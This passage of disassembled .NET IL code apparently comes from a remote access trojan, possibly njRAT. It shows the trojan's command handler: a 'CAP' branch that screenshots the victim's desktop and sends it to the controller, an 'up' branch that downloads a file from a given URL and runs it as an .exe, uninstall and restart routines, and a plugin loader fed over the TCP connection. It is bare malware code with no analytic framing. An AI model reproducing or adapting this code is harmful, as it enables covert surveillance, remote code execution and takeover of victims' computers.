      IL_05d6:  ldc.i4.3
      IL_05d7:  ldsfld     string j.OK::Y
      IL_05dc:  stelem.ref
      IL_05dd:  ldloc.s    V_39
      IL_05df:  ldc.i4.4
      IL_05e0:  ldc.i4.0
      IL_05e1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_05e6:  stelem.ref
      IL_05e7:  ldloc.s    V_39
      IL_05e9:  call       string [mscorlib]System.String::Concat(string[])
      IL_05ee:  call       bool j.OK::Send(string)
      IL_05f3:  pop
      IL_05f4:  ldloc.s    V_13
      IL_05f6:  ldstr      "A"
      IL_05fb:  call       object j.OK::Plugin(uint8[],
                                                           string)
      IL_0600:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0605:  stloc.s    V_14
      IL_0607:  ldc.i4.5
      IL_0608:  newarr     [mscorlib]System.String
      IL_060d:  stloc.s    V_39
      IL_060f:  ldloc.s    V_39
      IL_0611:  ldc.i4.0
      IL_0612:  ldstr      "ret"
      IL_0617:  stelem.ref
      IL_0618:  ldloc.s    V_39
      IL_061a:  ldc.i4.1
      IL_061b:  ldsfld     string j.OK::Y
      IL_0620:  stelem.ref
      IL_0621:  ldloc.s    V_39
      IL_0623:  ldc.i4.2
      IL_0624:  ldloc.0
      IL_0625:  ldc.i4.1
      IL_0626:  ldelem.ref
      IL_0627:  stelem.ref
      IL_0628:  ldloc.s    V_39
      IL_062a:  ldc.i4.3
      IL_062b:  ldsfld     string j.OK::Y
      IL_0630:  stelem.ref
      IL_0631:  ldloc.s    V_39
      IL_0633:  ldc.i4.4
      IL_0634:  ldloc.s    V_14
      IL_0636:  ldnull
      IL_0637:  ldstr      "GT"
      IL_063c:  ldc.i4.0
      IL_063d:  newarr     [mscorlib]System.Object
      IL_0642:  ldnull
      IL_0643:  ldnull
      IL_0644:  ldnull
      IL_0645:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_064a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_064f:  stloc.s    V_41
      IL_0651:  ldloca.s   V_41
      IL_0653:  call       string j.OK::ENB(string&)
      IL_0658:  stelem.ref
      IL_0659:  ldloc.s    V_39
      IL_065b:  call       string [mscorlib]System.String::Concat(string[])
      IL_0660:  call       bool j.OK::Send(string)
      IL_0665:  pop
      IL_0666:  leave      IL_0c53

      IL_066b:  ldloc.s    V_37
      IL_066d:  ldstr      "CAP"
      IL_0672:  ldc.i4.0
      IL_0673:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0678:  ldc.i4.0
      IL_0679:  bne.un     IL_0815

      IL_067e:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0683:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0688:  stloc.s    V_47
      IL_068a:  ldloca.s   V_47
      IL_068c:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0691:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0696:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_069b:  stloc.s    V_48
      IL_069d:  ldloca.s   V_48
      IL_069f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_06a4:  ldc.i4     0x21005
      IL_06a9:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_06ae:  stloc.s    V_21
      IL_06b0:  ldloc.s    V_21
      IL_06b2:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_06b7:  stloc.s    V_17
      IL_06b9:  ldloc.s    V_17
      IL_06bb:  ldc.i4.0
      IL_06bc:  ldc.i4.0
      IL_06bd:  ldc.i4.0
      IL_06be:  ldc.i4.0
      IL_06bf:  ldloca.s   V_49
      IL_06c1:  ldloc.s    V_21
      IL_06c3:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_06c8:  ldloc.s    V_21
      IL_06ca:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_06cf:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_06d4:  ldloc.s    V_49
      IL_06d6:  ldc.i4     0xcc0020
      IL_06db:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_06e0:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_06e5:  ldloc.s    V_17
        IL_06e7:  ldloca.s   V_48
        IL_06e9:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_06ee:  ldloca.s   V_49
        IL_06f0:  ldc.i4.s   32
        IL_06f2:  ldc.i4.s   32
        IL_06f4:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_06f9:  ldloc.s    V_49
        IL_06fb:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_0700:  ldloc.s    V_48
        IL_0702:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_0707:  leave.s    IL_0718

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0709:  dup
        IL_070a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_070f:  stloc.s    V_23
        IL_0711:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0716:  leave.s    IL_0718

      }  // end handler
      IL_0718:  ldloc.s    V_17
      IL_071a:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_071f:  ldloc.0
      IL_0720:  ldc.i4.1
      IL_0721:  ldelem.ref
      IL_0722:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0727:  ldloc.0
      IL_0728:  ldc.i4.2
      IL_0729:  ldelem.ref
      IL_072a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_072f:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_0734:  stloc.s    V_22
      IL_0736:  ldloc.s    V_22
      IL_0738:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_073d:  stloc.s    V_17
      IL_073f:  ldloc.s    V_17
      IL_0741:  ldloc.s    V_21
      IL_0743:  ldc.i4.0
      IL_0744:  ldc.i4.0
      IL_0745:  ldloc.s    V_22
      IL_0747:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_074c:  ldloc.s    V_22
      IL_074e:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0753:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_0758:  ldloc.s    V_17
      IL_075a:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_075f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0764:  stloc.s    V_19
      IL_0766:  ldstr      "CAP"
      IL_076b:  ldsfld     string j.OK::Y
      IL_0770:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0775:  stloc.s    V_41
      IL_0777:  ldloca.s   V_41
      IL_0779:  call       uint8[] j.OK::SB(string&)
      IL_077e:  starg.s    b
      IL_0780:  ldloc.s    V_19
      IL_0782:  ldarg.0
      IL_0783:  ldc.i4.0
      IL_0784:  ldarg.0
      IL_0785:  ldlen
      IL_0786:  conv.ovf.i4
      IL_0787:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_078c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0791:  stloc.s    V_20
      IL_0793:  ldloc.s    V_22
      IL_0795:  ldloc.s    V_20
      IL_0797:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_079c:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_07a1:  ldloc.s    V_20
      IL_07a3:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_07a8:  call       string j.OK::md5(uint8[])
      IL_07ad:  stloc.s    V_18
      IL_07af:  ldloc.s    V_18
      IL_07b1:  ldsfld     string j.OK::lastcap
      IL_07b6:  ldc.i4.0
      IL_07b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07bc:  ldc.i4.0
      IL_07bd:  beq.s      IL_07df

      IL_07bf:  ldloc.s    V_18
      IL_07c1:  stsfld     string j.OK::lastcap
      IL_07c6:  ldloc.s    V_19
      IL_07c8:  ldloc.s    V_20
      IL_07ca:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_07cf:  ldc.i4.0
      IL_07d0:  ldloc.s    V_20
      IL_07d2:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_07d7:  conv.ovf.i4
      IL_07d8:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_07dd:  br.s       IL_07e7

      IL_07df:  ldloc.s    V_19
      IL_07e1:  ldc.i4.0
      IL_07e2:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_07e7:  ldloc.s    V_19
      IL_07e9:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_07ee:  call       bool j.OK::Sendb(uint8[])
      IL_07f3:  pop
      IL_07f4:  ldloc.s    V_19
      IL_07f6:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_07fb:  ldloc.s    V_20
      IL_07fd:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0802:  ldloc.s    V_21
      IL_0804:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0809:  ldloc.s    V_22
      IL_080b:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0810:  leave      IL_0c53

      IL_0815:  ldloc.s    V_37
      IL_0817:  ldstr      "un"
      IL_081c:  ldc.i4.0
      IL_081d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0822:  ldc.i4.0
      IL_0823:  bne.un.s   IL_0897

      IL_0825:  ldloc.0
      IL_0826:  ldc.i4.1
      IL_0827:  ldelem.ref
      IL_0828:  stloc.s    V_50
      IL_082a:  ldloc.s    V_50
      IL_082c:  ldstr      "~"
      IL_0831:  ldc.i4.0
      IL_0832:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0837:  ldc.i4.0
      IL_0838:  bne.un.s   IL_0844

      IL_083a:  call       void j.OK::UNS()
      IL_083f:  leave      IL_0c53

      IL_0844:  ldloc.s    V_50
      IL_0846:  ldstr      "!"
      IL_084b:  ldc.i4.0
      IL_084c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0851:  ldc.i4.0
      IL_0852:  bne.un.s   IL_0864

      IL_0854:  ldc.i4.0
      IL_0855:  call       void j.OK::pr(int32)
      IL_085a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_085f:  leave      IL_0c53

      IL_0864:  ldloc.s    V_50
      IL_0866:  ldstr      "@"
      IL_086b:  ldc.i4.0
      IL_086c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0871:  ldc.i4.0
      IL_0872:  bne.un     IL_0bbb

      IL_0877:  ldc.i4.0
      IL_0878:  call       void j.OK::pr(int32)
      IL_087d:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0882:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0887:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_088c:  pop
      IL_088d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0892:  leave      IL_0c53

      IL_0897:  ldloc.s    V_37
      IL_0899:  ldstr      "up"
      IL_089e:  ldc.i4.0
      IL_089f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_08a4:  ldc.i4.0
      IL_08a5:  bne.un     IL_0a1c

      IL_08aa:  ldnull
      IL_08ab:  stloc.s    V_24
      IL_08ad:  ldloc.0
      IL_08ae:  ldc.i4.1
      IL_08af:  ldelem.ref
      IL_08b0:  ldc.i4.0
      IL_08b1:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_08b6:  ldc.i4.s   31
      IL_08b8:  bne.un.s   IL_092f

      .try
      {
        IL_08ba:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_08bf:  stloc.s    V_27
        IL_08c1:  ldloc.0
        IL_08c2:  ldc.i4.0
        IL_08c3:  ldelem.ref
        IL_08c4:  ldsfld     string j.OK::Y
        IL_08c9:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_08ce:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_08d3:  stloc.s    V_26
        IL_08d5:  ldloc.s    V_27
        IL_08d7:  ldarg.0
        IL_08d8:  ldloc.s    V_26
        IL_08da:  ldarg.0
        IL_08db:  ldlen
        IL_08dc:  conv.ovf.i4
        IL_08dd:  ldloc.s    V_26
        IL_08df:  sub.ovf
        IL_08e0:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_08e5:  ldloc.s    V_27
        IL_08e7:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_08ec:  call       uint8[] j.OK::ZIP(uint8[])
        IL_08f1:  stloc.s    V_24
        IL_08f3:  leave      IL_097b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_08f8:  dup
        IL_08f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_08fe:  stloc.s    V_28
        IL_0900:  ldstr      "MSG"
        IL_0905:  ldsfld     string j.OK::Y
        IL_090a:  ldstr      "Update ERROR"
        IL_090f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0914:  call       bool j.OK::Send(string)
        IL_0919:  pop
        IL_091a:  ldstr      "bla"
        IL_091f:  call       bool j.OK::Send(string)
        IL_0924:  pop
        IL_0925:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_092a:  leave      IL_0c53

      }  // end handler
      IL_092f:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0934:  stloc.s    V_29
      .try
      {
        IL_0936:  ldloc.s    V_29
        IL_0938:  ldloc.0
        IL_0939:  ldc.i4.1
        IL_093a:  ldelem.ref
        IL_093b:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0940:  stloc.s    V_24
        IL_0942:  leave.s    IL_097b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0944:  dup
        IL_0945:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_094a:  stloc.s    V_30
        IL_094c:  ldstr      "MSG"
        IL_0951:  ldsfld     string j.OK::Y
        IL_0956:  ldstr      "Update ERROR"
        IL_095b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0960:  call       bool j.OK::Send(string)
        IL_0965:  pop
        IL_0966:  ldstr      "bla"
        IL_096b:  call       bool j.OK::Send(string)
        IL_0970:  pop
        IL_0971:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0976:  leave      IL_0c53

      }  // end handler
      IL_097b:  ldstr      "bla"
      IL_0980:  call       bool j.OK::Send(string)
      IL_0985:  pop
      IL_0986:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_098b:  ldstr      ".exe"
      IL_0990:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0995:  stloc.s    V_25
      .try
      {
        IL_0997:  ldstr      "MSG"
        IL_099c:  ldsfld     string j.OK::Y
        IL_09a1:  ldstr      "Updating To "
        IL_09a6:  ldloc.s    V_25
        IL_09a8:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_09ad:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_09b2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_09b7:  call       bool j.OK::Send(string)
        IL_09bc:  pop
        IL_09bd:  ldc.i4     0x7d0
        IL_09c2:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_09c7:  ldloc.s    V_25
        IL_09c9:  ldloc.s    V_24
        IL_09cb:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_09d0:  ldloc.s    V_25
        IL_09d2:  ldstr      ".."
        IL_09d7:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_09dc:  pop
        IL_09dd:  leave.s    IL_0a12

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_09df:  dup
        IL_09e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_09e5:  stloc.s    V_31
        IL_09e7:  ldstr      "MSG"
        IL_09ec:  ldsfld     string j.OK::Y
        IL_09f1:  ldstr      "Update ERROR "
        IL_09f6:  ldloc.s    V_31
        IL_09f8:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_09fd:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0a02:  call       bool j.OK::Send(string)
        IL_0a07:  pop
        IL_0a08:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a0d:  leave      IL_0c53

      }  // end handler
      IL_0a12:  call       void j.OK::UNS()
      IL_0a17:  leave      IL_0c53

      IL_0a1c:  ldloc.s    V_37
      IL_0a1e:  ldstr      "Ex"
      IL_0a23:  ldc.i4.0
      IL_0a24:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a29:  ldc.i4.0
      IL_0a2a:  bne.un     IL_0aee

      IL_0a2f:  ldsfld     object j.OK::PLG
      IL_0a34:  brtrue.s   IL_0a8b

      IL_0a36:  ldstr      "PLG"
      IL_0a3b:  call       bool j.OK::Send(string)
      IL_0a40:  pop
      IL_0a41:  ldc.i4.0
      IL_0a42:  stloc.s    V_32
      IL_0a44:  br.s       IL_0a56

      IL_0a46:  ldloc.s    V_32
      IL_0a48:  ldc.i4.1
      IL_0a49:  add.ovf
      IL_0a4a:  stloc.s    V_32
      IL_0a4c:  ldc.i4     0x3e8
      IL_0a51:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0a56:  ldsfld     object j.OK::PLG
      IL_0a5b:  ldnull
      IL_0a5c:  ceq
      IL_0a5e:  ldc.i4.0
      IL_0a5f:  ceq
      IL_0a61:  ldloc.s    V_32
      IL_0a63:  ldc.i4.s   20
      IL_0a65:  ceq
      IL_0a67:  or
      IL_0a68:  ldsfld     bool j.OK::Cn
      IL_0a6d:  ldc.i4.0
      IL_0a6e:  ceq
      IL_0a70:  or
      IL_0a71:  brfalse.s  IL_0a46

      IL_0a73:  ldsfld     object j.OK::PLG
      IL_0a78:  ldnull
      IL_0a79:  ceq
      IL_0a7b:  ldsfld     bool j.OK::Cn
      IL_0a80:  ldc.i4.0
      IL_0a81:  ceq
      IL_0a83:  or
      IL_0a84:  brfalse.s  IL_0a8b

      IL_0a86:  leave      IL_0c53

      IL_0a8b:  ldsfld     object j.OK::PLG
      IL_0a90:  ldnull
      IL_0a91:  ldstr      "ind"
      IL_0a96:  ldc.i4.1
      IL_0a97:  newarr     [mscorlib]System.Object
      IL_0a9c:  stloc.s    V_40
      IL_0a9e:  ldloc.s    V_40
      IL_0aa0:  ldc.i4.0
      IL_0aa1:  ldarg.0
      IL_0aa2:  stelem.ref
      IL_0aa3:  ldloc.s    V_40
      IL_0aa5:  stloc.s    V_51
      IL_0aa7:  ldloc.s    V_51
      IL_0aa9:  ldnull
      IL_0aaa:  ldnull
      IL_0aab:  ldc.i4.1
      IL_0aac:  newarr     [mscorlib]System.Boolean
      IL_0ab1:  stloc.s    V_52
      IL_0ab3:  ldloc.s    V_52
      IL_0ab5:  ldc.i4.0
      IL_0ab6:  ldc.i4.1
      IL_0ab7:  stelem.i1
      IL_0ab8:  ldloc.s    V_52
      IL_0aba:  ldc.i4.1
      IL_0abb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0ac0:  pop
      IL_0ac1:  ldloc.s    V_52
      IL_0ac3:  ldc.i4.0
      IL_0ac4:  ldelem.i1
      IL_0ac5:  brfalse    IL_0bbb

      IL_0aca:  ldloc.s    V_51
      IL_0acc:  ldc.i4.0
      IL_0acd:  ldelem.ref
      IL_0ace:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ad3:  ldtoken    uint8[]
      IL_0ad8:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0add:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0ae2:  castclass  uint8[]
      IL_0ae7:  starg.s    b
      IL_0ae9:  leave      IL_0c53

      IL_0aee:  ldloc.s    V_37
      IL_0af0:  ldstr      "PLG"
      IL_0af5:  ldc.i4.0
      IL_0af6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0afb:  ldc.i4.0
      IL_0afc:  bne.un     IL_0bbb

      IL_0b01:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0b06:  stloc.s    V_34
      IL_0b08:  ldloc.0
      IL_0b09:  ldc.i4.0
      IL_0b0a:  ldelem.ref
      IL_0b0b:  ldsfld     string j.OK::Y
      IL_0b10:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0b15:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0b1a:  stloc.s    V_33
      IL_0b1c:  ldloc.s    V_34
      IL_0b1e:  ldarg.0
      IL_0b1f:  ldloc.s    V_33
      IL_0b21:  ldarg.0
      IL_0b22:  ldlen
      IL_0b23:  conv.ovf.i4
      IL_0b24:  ldloc.s    V_33
      IL_0b26:  sub.ovf
      IL_0b27:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0b2c:  ldloc.s    V_34
      IL_0b2e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0b33:  call       uint8[] j.OK::ZIP(uint8[])
      IL_0b38:  ldstr      "A"
      IL_0b3d:  call       object j.OK::Plugin(uint8[],
                                                           string)
      IL_0b42:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0b47:  stsfld     object j.OK::PLG
      IL_0b4c:  ldsfld     object j.OK::PLG
      IL_0b51:  ldnull
      IL_0b52:  ldstr      "H"
      IL_0b57:  ldc.i4.1
      IL_0b58:  newarr     [mscorlib]System.Object
      IL_0b5d:  stloc.s    V_51
      IL_0b5f:  ldloc.s    V_51
      IL_0b61:  ldc.i4.0
      IL_0b62:  ldsfld     string j.OK::H
      IL_0b67:  stelem.ref
      IL_0b68:  ldloc.s    V_51
      IL_0b6a:  ldnull
      IL_0b6b:  ldnull
      IL_0b6c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0b71:  ldsfld     object j.OK::PLG
      IL_0b76:  ldnull
      IL_0b77:  ldstr      "P"
      IL_0b7c:  ldc.i4.1
      IL_0b7d:  newarr     [mscorlib]System.Object
      IL_0b82:  stloc.s    V_51
      IL_0b84:  ldloc.s    V_51
      IL_0b86:  ldc.i4.0
      IL_0b87:  ldsfld     string j.OK::P
      IL_0b8c:  stelem.ref
      IL_0b8d:  ldloc.s    V_51
      IL_0b8f:  ldnull
      IL_0b90:  ldnull
      IL_0b91:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0b96:  ldsfld     object j.OK::PLG
      IL_0b9b:  ldnull
      IL_0b9c:  ldstr      "c"
      IL_0ba1:  ldc.i4.1
      IL_0ba2:  newarr     [mscorlib]System.Object
      IL_0ba7:  stloc.s    V_51
      IL_0ba9:  ldloc.s    V_51
      IL_0bab:  ldc.i4.0
      IL_0bac:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0bb1:  stelem.ref
      IL_0bb2:  ldloc.s    V_51
      IL_0bb4:  ldnull
      IL_0bb5:  ldnull
      IL_0bb6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0bbb:  leave      IL_0c53

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0bc0:  dup
      IL_0bc1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0bc6:  stloc.s    V_35
      IL_0bc8:  ldloc.0
      IL_0bc9:  ldlen
      IL_0bca:  conv.ovf.i4
      IL_0bcb:  ldc.i4.0
      IL_0bcc:  ble.s      IL_0bf9

      IL_0bce:  ldloc.0
      IL_0bcf:  ldc.i4.0
      IL_0bd0:  ldelem.ref
      IL_0bd1:  ldstr      "Ex"
      IL_0bd6:  ldc.i4.0
      IL_0bd7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bdc:  ldc.i4.0
      IL_0bdd:  ceq
      IL_0bdf:  ldloc.0
      IL_0be0:  ldc.i4.0
      IL_0be1:  ldelem.ref
      IL_0be2:  ldstr      "PLG"
      IL_0be7:  ldc.i4.0
      IL_0be8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bed:  ldc.i4.0
      IL_0bee:  ceq
      IL_0bf0:  or
      IL_0bf1:  brfalse.s  IL_0bf9

      IL_0bf3:  ldnull
